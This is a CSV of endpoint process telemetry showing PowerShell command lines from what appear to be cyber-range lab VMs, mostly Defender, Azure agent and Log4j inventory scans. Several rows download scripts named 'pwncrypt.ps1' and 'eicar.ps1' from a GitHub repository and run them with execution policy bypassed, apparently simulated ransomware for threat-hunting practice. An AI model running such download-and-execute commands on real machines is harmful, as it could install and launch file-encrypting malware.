Timestamp,DeviceName,ProcessCommandLine
1/16/2026 18:27,jinks-server-fi,"powershell  -NoProfile -Command ""& {$j = sajb {$ErrorActionPreference = 'SilentlyContinue';$fileInclude = 'chef-client$|KSM\.exe$|Adobe Substance 3D Modeler\.exe$|wix\.exe$|\\erl\.exe$|InternetIdAdmin\.exe$|rfusclient\.exe$|mDNSResponder\.exe$|pgAdmin4\.exe$|tomcat\\bin\\ScadaBR\.exe$|\\mqiptService\.exe$|\\OutputMessenger\.exe$|dpcpp\.exe$|fortcom\.exe$|AnyDesk\.exe$|vtune-gui\.exe$|Adobe Substance 3D Designer\.exe$|quartus\.exe$|FSViewer\.exe$|R\.exe$|CrushFTP\.exe$|coder\.exe$|TwinCAT-Package-Manager-Setup\.exe$|ollama\.exe$|rustdesk.*\.exe$|rclone\.exe$|openssl\.exe$|GladServerAgentService\.exe$|\\runmqtmc\.exe$|sqlite3\.exe$|winsqlite3\.exe$|dcvviewer\.exe$|minio\.exe$|TeamCityService\.exe$|PsExec\.exe$|psfile\.exe$|PsGetsid\.exe$|PsInfo\.exe$|pskill\.exe$|pslist\.exe$|PsLoggedon\.exe$|psloglist\.exe$|pspasswd\.exe$|psping\.exe$|PsService\.exe$|psshutdown\.exe$|pssuspend\.exe$|php\.exe$|php-cgi\.exe$|php-win\.exe$|duckdb\.exe$|Adobe Substance 3D Sampler\.exe$|java\.exe$|javaw\.exe$|javasw\.exe$|MSIAfterburner\.exe$|PDFXEdit\.exe$|slack\\slack\.exe$|\\SetupRST\.exe$|mongosh\.exe$|Mattermost\.exe$|lightroom\.exe$|Snwlconnect\.exe$|vmware-csd\.exe$|webstorm64\.exe$|ruby\.exe$|\\node\.exe$|notepad\+\+\.exe$|sam\.exe$|Adobe Substance 3D Stager\.exe$|RustDeskServer\.Setup\.exe$|Adobe Substance 3D Painter\.exe$|MongoDBCompass.*\.exe$|httpd\.exe$|VProConsole\.exe$|HotkeyServiceUWP\.exe$|KeePass\.exe$|Sysmon\.exe$|Sysmon64\.exe$|Sysmon64a\.exe$|traceanalyzer\.exe$|curl\.exe$|dsmc\.exe$|ace\.cmd$|.*\.war$|.*\.gemspec$|ContentsXML\\inventory\.xml$|CygUtils\.plugin$|BSMRVersion\.prp$|.*\.profile$|AppProperties_Generated\.class$|.*\.jar$|\\tika.*\.jar$|.*sap\.com.*\.jar$|\\devserver_metadataupload_war\.jar$|glassfish\.jar$|\\amazon-s3-encryption-client-java.*\.jar$|\\commons-fileupload.*\.jar$|activemq\.jar$|UserPrefs_Acrobat\.txt$|ServerJson\.txt$|package\.json$|mysql\\xdevapi\\package\.json$|libwebp\.dll$|Telerik\.Web\.UI\.dll$|Telerik\.WinControls\.dll$|libcurl\.dll$|libcurl_x64\.dll$|libcurl-devel\.dll$|impi\.dll$|libssl\.dll$|libssl-3\.dll$|libssl-3-x64\.dll$|libssl-1_1\.dll$|libssl-1_1-x64\.dll$|sqlite3\.dll$|winsqlite3\.dll$|java\.dll$|javaw\.dll$|javasw\.dll$|jvm\.dll$|\\Telerik\.Documents\.Core\.dll$|\\Telerik\.Windows\.Documents\.Core\.dll$|Telerik\.Windows\.Controls\.dll$|iqvw64\.sys$|iqvw32\.sys$|iqvw64e\.sys$|RTCore32\.sys$|RTCore64\.sys$|bundle_build\.properties$|ParseExcel\.pm$'; $pathExclude = '\\MicrosoftEdge\\Cache\\|\\Windows\\Temporary\.Internet\.Files\\|\\Windows\\INetCache\\|\\Chrome\\User\.Data\\Default\\Cache\\|\\Users\\.*\\AppData\\Local\\Packages\\Microsoft\.AAD\.BrokerPlugin_cw5n1h2txyewy\\AC\\TokenBroker\\Accounts|\\Users\\.*\\AppData\\Local\\ConnectedDevicesPlatform|\\Users\\.*\\AppData\\Local\\Microsoft\\TokenBroker\\Cache|\\Windows\\SystemApps\\Microsoft\.AAD\.BrokerPlugin_cw5n1h2txyewy|\\Windows\\WinSxS\\|\\Windows\\servicing\\|\\\$Recycle\.Bin.*'; $pathInclude = ('C:\'); function CustomSeek( [System.IO.FileSystemInfo] $Item ) { if ( ! ($Item.Attributes -band [IO.FileAttributes]::ReparsePoint) ) { if ( $Item.GetType() -eq [System.IO.DirectoryInfo] ) { foreach ($ChildItem in gci -Path $Item.FullName -Force ) { if ( $pathExclude -eq '' -or $ChildItem.FullName -notmatch $pathExclude ) { CustomSeek $ChildItem; } } } else { if ( $Item.FullName -match $fileInclude -and $Item.FullName -notmatch $pathExclude ) { $Item; } } } } CustomSeek( Get-Item $pathInclude -Force ) | % {$_.FullName} | Write-Host};$r = wjb $j -Timeout 3000; rcjb $j;}""  "
1/16/2026 18:26,mde-test-cyn,"powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {if ($ExecutionContext.SessionState.LanguageMode -eq 'FullLanguage') {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8}else {chcp 65001}; &  'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8809.14538576.0.14538576-8d2440cf6f4650cd003cf316c643778c9b43bd76\1648ba23-91bf-4822-bd45-661d10a1ea81.ps1' }"""
1/16/2026 18:25,jinks-server-fi,"powershell.exe  -Command ""[System.BitConverter]::ToString((Get-SecureBootUEFI dbx).bytes)"";  "
1/16/2026 18:25,jinks-server-fi,"powershell.exe  -Command ""[System.Text.Encoding]::ASCII.GetString((Get-SecureBootUEFI db).bytes) -match \""Microsoft Corporation UEFI CA 2011\"""";  "
1/16/2026 18:25,jinks-server-fi,"powershell.exe  ""Get-AppxPackage -AllUsers | select name, version, installlocation, architecture, publisher | Format-List | out-string -width 4096""  "
1/16/2026 18:25,windows-target-,powershell.exe  -ExecutionPolicy Bypass -File C:\programdata\eicar.ps1
1/16/2026 18:25,logn-pacific-dc,powershell.exe  -ExecutionPolicy Bypass -File C:\programdata\eicar.ps1
1/16/2026 18:24,logn-pacific-dc,"""powershell.exe"" C:\Packages\Plugins\Microsoft.Azure.AzureDefenderForServers.MDE.Windows\1.0.17.0\MdeExtensionHandler.ps1 "
1/16/2026 18:24,logn-pacific-dc,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1 -OutFile C:\programdata\eicar.ps1
1/16/2026 18:24,windows-target-,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1 -OutFile C:\programdata\eicar.ps1
1/16/2026 18:24,windows-target-,powershell  -ExecutionPolicy Unrestricted -File script33.ps1
1/16/2026 18:24,logn-pacific-dc,powershell  -ExecutionPolicy Unrestricted -File script13.ps1
1/16/2026 18:24,logn-pacific-dc,powershell.exe  -NoProfile -NonInteractive -ExecutionPolicy RemoteSigned -File C:\Packages\Plugins\Microsoft.GuestConfiguration.ConfigurationforWindows\1.29.101.0\bin\enable.ps1 -StartAsyncProcess 
1/16/2026 18:24,logn-pacific-dc,Powershell.exe  -NoProfile -NonInteractive -ExecutionPolicy Bypass C:\Packages\Plugins\Microsoft.Azure.AzureDefenderForServers.MDE.Windows\1.0.17.0\\MdeExtensionHandlerWrapper.ps1 -Action enable
1/16/2026 18:24,mm-atomicred-vm,powershell.exe  -NoProfile -NonInteractive -ExecutionPolicy RemoteSigned -File C:\Packages\Plugins\Microsoft.GuestConfiguration.ConfigurationforWindows\1.29.101.0\bin\enable.ps1 -StartAsyncProcess 
1/16/2026 18:24,winows-btest,powershell.exe  -NoProfile -NonInteractive -ExecutionPolicy RemoteSigned -File C:\Packages\Plugins\Microsoft.GuestConfiguration.ConfigurationforWindows\1.29.101.0\bin\enable.ps1 -StartAsyncProcess 
1/16/2026 18:24,sandboxvm,powershell.exe  -NoProfile -NonInteractive -ExecutionPolicy RemoteSigned -File C:\Packages\Plugins\Microsoft.GuestConfiguration.ConfigurationforWindows\1.29.101.0\bin\enable.ps1 -StartAsyncProcess 
1/16/2026 18:24,cyberlab,powershell.exe  -NoProfile -NonInteractive -ExecutionPolicy RemoteSigned -File C:\Packages\Plugins\Microsoft.GuestConfiguration.ConfigurationforWindows\1.29.101.0\bin\enable.ps1 -StartAsyncProcess 
1/16/2026 18:24,kobe24,powershell.exe  -NoProfile -NonInteractive -ExecutionPolicy RemoteSigned -File C:\Packages\Plugins\Microsoft.GuestConfiguration.ConfigurationforWindows\1.29.101.0\bin\enable.ps1 -StartAsyncProcess 
1/16/2026 18:24,jinks-server-fi,"powershell  -NoProfile -Command ""& {$j = sajb {$ErrorActionPreference = 'SilentlyContinue';$ErrorActionPreference = 'SilentlyContinue';$jars = $(Get-ChildItem -Path 'C:\*', 'D:\*' -Recurse -Include '*.jar','*.war','*.ear'| Where-Object Attributes -NotLike ""*ReparsePoint*""| Where-Object { -not $_.PSIsContainer }| % {$_.FullName});try{Add-Type -AssemblyName System.IO.Compression.FileSystem;}catch{'no_archive_inspection'};$num_jars_found = 0;$num_jars_insp = 0;$jars_mod = 0;$rxp_log4j = '(?:\\|\/)(log4j-?(?:core-?)?(\d[.\d]+)?(?:-?((?:rc|alpha|beta)-?\d*))?\.jar)';$rgx_log4j = [Regex]::new($rxp_log4j);$rxp_class = '(.*JndiLookup.class)?(.*JMSAppender.class)?(.*JdbcAppender.class)?';$rgx_class = [Regex]::new($rxp_class,[System.Text.RegularExpressions.RegexOptions]::IgnoreCase);foreach($jar in $jars){$num_jars_found++;};-join('num_jars_found:',$num_jars_found);foreach($jar in $jars){$jars_count++;$jars_mod = $jars_count % 100;if($jars_mod -eq 0){-join('# jars processed marker: ',$jars_count, ' of ',$num_jars_found);};$l4jf = $l4jd = $l4je = $jdlc = $jmsa = $jdbc = $null;$inspect = $true;if($rgx_log4j.IsMatch($jar)){$l4jf=$jar};$jar_open_read = [IO.Compression.ZipFile]::OpenRead($jar);$entries = try{$jar_open_read;}catch{$inspect=$false;};if($inspect){foreach($e in $entries.Entries){$fn = $e.Fullname;if($rgx_class.Match($fn).Groups[1].Value){$jdlc = 'Found'};if($rgx_class.Match($fn).Groups[2].Value){$jmsa = 'Found'};if($rgx_class.Match($fn).Groups[3].Value){$jdbc = 'Found'};$rxp_file = '(.*pom.properties$)?(.*MANIFEST.MF$)?';$rgx_file = [Regex]::new($rxp_file);$rxp_pomf = '.*(artifactId\s?=\s?log4j(?:-core)?)(?:\s|$).*';$rgx_pomf = [Regex]::new($rxp_pomf);$rxp_pomv = '.*(?:\n|\r\n).*:\s(?:.*=)(\d.+?)(?:\s|,|$)';$rgx_pomv = [Regex]::new($rxp_pomv);$rxp_pomv2 = '.*version=(\d.+?)(?:\s|$)';$rgx_pomv2 = [Regex]::new($rxp_pomv2);$rxp_mfp1 = '.*Log4jReleaseVersion:\s+(.*?)(?:\s|$)';$rgx_mfp1 = [Regex]::new($rxp_mfp1);$rxp_mfp2 = '.*(?:^|\s|\n)Name:\s(?:.*[Aa]pache.*[Ll]og4j)\/?(?:\n|\r\n)?(?:.*\n|\r\n)?(?:.*\n|\r\n)?.*(?:Implementation|Bundle)-Version:\s(\d.+?)(?:\s|$)';$rgx_mfp2 = [Regex]::new($rxp_mfp2);$rxp_mfp3 = '.*(?:^|\s|\n)Name:\s(?:.*[Aa]pache.*[Ll]og4j).*(?:\n|\r\n).*:\s(?:.*=)(\d.+?)(?:\s|,|$)';$rgx_mfp3 = [Regex]::new($rxp_mfp3);if(!$l4je -and $jar -notmatch '.*log4j(?:-\d+(?:\.\d+)*)*-api(?:-\d+(?:\.\d+)*)*.jar'){if($rgx_file.Match($fn).Groups[1].Value){$t = [System.IO.StreamReader]::new($e.Open());$pom_file = $t.ReadToEnd();if($rgx_pomf.Match($pom_file).Value){$pom_ver = $rgx_pomv.Match($pom_file).Groups[1].Value;if (!$pom_ver){$pom_ver = $rgx_pomv2.Match($pom_file).Groups[1].Value;};$l4je = -join('e|',$jar,'|',$fn,'|',$pom_ver);};};if($rgx_file.Match($fn).Groups[2].Value){$t = [System.IO.StreamReader]::new($e.Open());$manifest_file = $t.ReadToEnd();if($rgx_mfp1.Match($manifest_file).Value){$man_ver = $rgx_mfp1.Match($manifest_file).Groups[1].Value;$l4je = -join('e|',$jar,'|',$fn,'|',$man_ver);};if($rgx_mfp2.Match($manifest_file).Value){$man_ver = $rgx_mfp2.Match($manifest_file).Groups[1].Value;$l4je = -join('e|',$jar,'|',$fn,'|',$man_ver);};if($rgx_mfp3.Match($manifest_file).Value){$man_ver = $rgx_mfp3.Match($manifest_file).Groups[1].Value;$l4je = -join('e|',$jar,'|',$fn,'|',$man_ver);};$t.Close();$t.Dispose();};};if($rgx_log4j.IsMatch($fn)){$l4jd = $fn;$l4jd_zip = [IO.Compression.ZipArchive]::new($e.Open());foreach ($l4jdE in $l4jd_zip.Entries){$le = $l4jdE.FullName;if($rgx_class.Match($le).Groups[1].Value){$jdlc = 'Found'};if($rgx_class.Match($le).Groups[2].Value){$jmsa = 'Found'};if($rgx_class.Match($le).Groups[3].Value){$jdbc = 'Found'};};$l4jd_zip.Dispose();$e.Archive.Dispose();[GC]::Collect();};if(!$jdlc){$jdlc = 'Not Found';};if(!$jmsa){$jmsa = 'Not Found';};if(!$jdbc){$jdbc = 'Not Found';};};if(!$jdlc){$jdlc = 'Unknown';};if(!$jmsa){$jmsa = 'Unknown';};if(!$jdbc){$jdbc = 'Unknown';};};if($l4jf){-join('f|',$l4jf,'|',$jdlc,'|',$jmsa,'|',$jdbc,\""`r\"")| Write-Host};if($l4jd){-join('d|',$jar,'|',$l4jd,'|',$jdlc,'|',$jmsa,'|',$jdbc,\""`r\"")| Write-Host};if($l4je){-join($l4je,'|',$jdlc,'|',$jmsa,'|',$jdbc,\""`r\"")| Write-Host};[GC]::Collect();[System.Threading.Thread]::Sleep(250);};-join('# jars processed marker: ',$jars_count, ' of ',$num_jars_found);-join('num_jars_found:',$num_jars_found);};$r = wjb $j -Timeout 2880; rcjb $j;}""  "
1/16/2026 18:23,sandboxvm,"powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {if ($ExecutionContext.SessionState.LanguageMode -eq 'FullLanguage') {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8}else {chcp 65001}; &  'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8809.14538576.0.14538576-8d2440cf6f4650cd003cf316c643778c9b43bd76\a391f42c-7e1a-4611-8494-1817d2420e09.ps1' }"""
1/16/2026 18:23,kjvm1,"powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {if ($ExecutionContext.SessionState.LanguageMode -eq 'FullLanguage') {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8}else {chcp 65001}; &  'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8809.14538576.0.14538576-8d2440cf6f4650cd003cf316c643778c9b43bd76\cb7aec68-dfca-4632-88ad-5b019cb0957d.ps1' }"""
1/16/2026 18:23,jinks-server-fi,"powershell  -NoProfile -Command ""& {$j = sajb {$ErrorActionPreference = 'SilentlyContinue';$PSVersionTable.PSVersion.Major,$PSVersionTable.PSVersion.Minor,$PSVersionTable.PSVersion.Build};$r = wjb $j -Timeout 30; rcjb $j;}""  "
1/16/2026 18:23,mm-atomicred-vm,"powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {if ($ExecutionContext.SessionState.LanguageMode -eq 'FullLanguage') {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8}else {chcp 65001}; &  'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8809.14538576.0.14538576-8d2440cf6f4650cd003cf316c643778c9b43bd76\cfa5b5b7-e717-474f-ad6a-a99ebd513b5c.ps1' }"""
1/16/2026 18:22,jinks-server-fi,"powershell  -NoProfile -Command ""& {$j = sajb {$ErrorActionPreference = 'SilentlyContinue';$fileInclude = '.*\\ISL Light Client\.exe$'; $pathExclude = '\\MicrosoftEdge\\Cache\\|\\Windows\\Temporary\.Internet\.Files\\|\\Windows\\INetCache\\|\\Chrome\\User\.Data\\Default\\Cache\\|\\Users\\.*\\AppData\\Local\\Packages\\Microsoft\.AAD\.BrokerPlugin_cw5n1h2txyewy\\AC\\TokenBroker\\Accounts|\\Users\\.*\\AppData\\Local\\ConnectedDevicesPlatform|\\Users\\.*\\AppData\\Local\\Microsoft\\TokenBroker\\Cache|\\Windows\\SystemApps\\Microsoft\.AAD\.BrokerPlugin_cw5n1h2txyewy|\\Windows\\WinSxS\\|\\Windows\\servicing\\|\\\$Recycle\.Bin.*'; $pathInclude = ('C:\'); function CustomSeek( [System.IO.FileSystemInfo] $Item ) { if ( ! ($Item.Attributes -band [IO.FileAttributes]::ReparsePoint) ) { if ( $Item.GetType() -eq [System.IO.DirectoryInfo] ) { foreach ($ChildItem in gci -Path $Item.FullName -Force ) { if ( $pathExclude -eq '' -or $ChildItem.FullName -notmatch $pathExclude ) { CustomSeek $ChildItem; } } } else { if ( $Item.FullName -match $fileInclude -and $Item.FullName -notmatch $pathExclude ) { $Item; } } } } CustomSeek( Get-Item $pathInclude -Force ) | % {$_.FullName} | Write-Host};$r = wjb $j -Timeout 1800; rcjb $j;}""  "
1/16/2026 18:22,jinks-server-fi,"powershell  -NoProfile -Command ""& {$j = sajb {$ErrorActionPreference = 'SilentlyContinue';$fileInclude = '.*\\site-packages\\.*\.egg-info$|.*\\site-packages\\.*\.egg\\EGG-INFO\\PKG-INFO$|.*\\site-packages\\.*\.egg-info\\PKG-INFO$|.*\\site-packages\\.*\.dist-info\\METADATA$'; $pathExclude = '\\MicrosoftEdge\\Cache\\|\\Windows\\Temporary\.Internet\.Files\\|\\Windows\\INetCache\\|\\Chrome\\User\.Data\\Default\\Cache\\|\\Users\\.*\\AppData\\Local\\Packages\\Microsoft\.AAD\.BrokerPlugin_cw5n1h2txyewy\\AC\\TokenBroker\\Accounts|\\Users\\.*\\AppData\\Local\\ConnectedDevicesPlatform|\\Users\\.*\\AppData\\Local\\Microsoft\\TokenBroker\\Cache|\\Windows\\SystemApps\\Microsoft\.AAD\.BrokerPlugin_cw5n1h2txyewy|\\Windows\\WinSxS\\|\\Windows\\servicing\\|\\\$Recycle\.Bin.*'; $pathInclude = ('C:\'); function CustomSeek( [System.IO.FileSystemInfo] $Item ) { if ( ! ($Item.Attributes -band [IO.FileAttributes]::ReparsePoint) ) { if ( $Item.GetType() -eq [System.IO.DirectoryInfo] ) { foreach ($ChildItem in gci -Path $Item.FullName -Force ) { if ( $pathExclude -eq '' -or $ChildItem.FullName -notmatch $pathExclude ) { CustomSeek $ChildItem; } } } else { if ( $Item.FullName -match $fileInclude -and $Item.FullName -notmatch $pathExclude ) { $Item; } } } } CustomSeek( Get-Item $pathInclude -Force ) | % {$_.FullName} | Write-Host};$r = wjb $j -Timeout 1620; rcjb $j;}""  "
1/16/2026 18:21,jinks-server-fi,"powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {if ($ExecutionContext.SessionState.LanguageMode -eq 'FullLanguage') {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8}else {chcp 65001}; &  'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8809.14538576.0.14538576-831abcda016d5e7eebb3455868dc9906f91acf53\969023c4-546f-45ea-8f49-ca6d45ba75f4.ps1' }"""
1/16/2026 18:20,jinks-server-fi,"powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {if ($ExecutionContext.SessionState.LanguageMode -eq 'FullLanguage') {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8}else {chcp 65001}; &  'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8809.14538576.0.14538576-831abcda016d5e7eebb3455868dc9906f91acf53\fc19515e-4fbb-46d1-b1f4-a28b394632fe.ps1' }"""
1/16/2026 18:19,kobe24,"""powershell.exe"" -noninteractive -outputFormat xml -NonInteractive -encodedCommand IABbAEUAbgB2AGkAcgBvAG4AbQBlAG4AdABdADoAOgBPAFMAVgBlAHIAcwBpAG8AbgAuAFYAZQByAHMAaQBvAG4AIAA= -inputFormat xml"
1/16/2026 18:17,kobe24,"""powershell.exe"" -noninteractive -outputFormat xml -NonInteractive -encodedCommand IABbAEUAbgB2AGkAcgBvAG4AbQBlAG4AdABdADoAOgBPAFMAVgBlAHIAcwBpAG8AbgAuAFYAZQByAHMAaQBvAG4AIAA= -inputFormat xml"
1/16/2026 18:14,final-lab-vm-ad,"powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {if ($ExecutionContext.SessionState.LanguageMode -eq 'FullLanguage') {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8}else {chcp 65001}; &  'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8809.14538576.0.14538576-831abcda016d5e7eebb3455868dc9906f91acf53\149ae17f-1c51-47e8-90b8-8175a782d62b.ps1' }"""
1/16/2026 18:13,kjvm1,"powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {if ($ExecutionContext.SessionState.LanguageMode -eq 'FullLanguage') {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8}else {chcp 65001}; &  'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8809.14538576.0.14538576-8d2440cf6f4650cd003cf316c643778c9b43bd76\53159fd8-6386-48c2-91e8-cf4860599c43.ps1' }"""
1/16/2026 18:13,jinks-server-fi,"powershell.exe  ""& {$webClient = New-Object System.Net.WebClient; $webClient.Headers.add(\""Metadata\"", \""true\""); $webClient.DownloadString(\""http://168.63.129.16/metadata/instance/compute?api-version=2017-12-01\"")};""  "
1/16/2026 18:13,jinks-server-fi,"powershell.exe  ""& {$webClient = New-Object System.Net.WebClient; $webClient.DownloadString(\""http://168.63.129.16/metadata/latest/InstanceInfo\"")};""  "
1/16/2026 18:13,jinks-server-fi,"powershell.exe  ""& {$webClient = New-Object System.Net.WebClient; $webClient.Headers.add(\""x-ms-version\"", \""2015-04-05\""); $webClient.Headers.add(\""x-ms-guest-agent-name\"", \""WaAgent-2.5.0.0 (2.7.0.0)\""); $webClient.DownloadString(\""http://168.63.129.16/machine?comp=goalstate\"")};""  "
1/16/2026 18:13,wvm-edr-target,powershell.exe  -ExecutionPolicy Bypass -File C:\programdata\pwncrypt.ps1
1/16/2026 18:13,logn-pacific-dc,powershell.exe  -ExecutionPolicy Bypass -File C:\programdata\pwncrypt.ps1
1/16/2026 18:13,logn-pacific-dc,"""powershell.exe"" C:\Packages\Plugins\Microsoft.Azure.AzureDefenderForServers.MDE.Windows\1.0.17.0\MdeExtensionHandler.ps1 "
1/16/2026 18:13,wvm-edr-target,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1
1/16/2026 18:13,wvm-edr-target,powershell  -ExecutionPolicy Unrestricted -File script3.ps1
1/16/2026 18:13,logn-pacific-dc,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1
1/16/2026 18:12,cyberlab,powershell.exe  -NoProfile -NonInteractive -ExecutionPolicy RemoteSigned -File C:\Packages\Plugins\Microsoft.GuestConfiguration.ConfigurationforWindows\1.29.101.0\bin\enable.ps1 -StartAsyncProcess 
1/16/2026 18:12,logn-pacific-dc,powershell  -ExecutionPolicy Unrestricted -File script12.ps1
1/16/2026 18:12,wvm-edr-target,powershell.exe  -NoProfile -NonInteractive -ExecutionPolicy RemoteSigned -File C:\Packages\Plugins\Microsoft.GuestConfiguration.ConfigurationforWindows\1.29.101.0\bin\enable.ps1 -StartAsyncProcess 
1/16/2026 18:12,kobe24,powershell.exe  -NoProfile -NonInteractive -ExecutionPolicy RemoteSigned -File C:\Packages\Plugins\Microsoft.GuestConfiguration.ConfigurationforWindows\1.29.101.0\bin\enable.ps1 -StartAsyncProcess 
1/16/2026 18:12,windows-target-,powershell.exe  -ExecutionPolicy Bypass -File C:\programdata\pwncrypt.ps1
1/16/2026 18:12,logn-pacific-dc,Powershell.exe  -NoProfile -NonInteractive -ExecutionPolicy Bypass C:\Packages\Plugins\Microsoft.Azure.AzureDefenderForServers.MDE.Windows\1.0.17.0\\MdeExtensionHandlerWrapper.ps1 -Action enable
1/16/2026 18:12,logn-pacific-dc,powershell.exe  -NoProfile -NonInteractive -ExecutionPolicy RemoteSigned -File C:\Packages\Plugins\Microsoft.GuestConfiguration.ConfigurationforWindows\1.29.101.0\bin\enable.ps1 -StartAsyncProcess 
1/16/2026 18:12,sandboxvm,powershell.exe  -NoProfile -NonInteractive -ExecutionPolicy RemoteSigned -File C:\Packages\Plugins\Microsoft.GuestConfiguration.ConfigurationforWindows\1.29.101.0\bin\enable.ps1 -StartAsyncProcess 
1/16/2026 18:12,winows-btest,powershell.exe  -NoProfile -NonInteractive -ExecutionPolicy RemoteSigned -File C:\Packages\Plugins\Microsoft.GuestConfiguration.ConfigurationforWindows\1.29.101.0\bin\enable.ps1 -StartAsyncProcess 
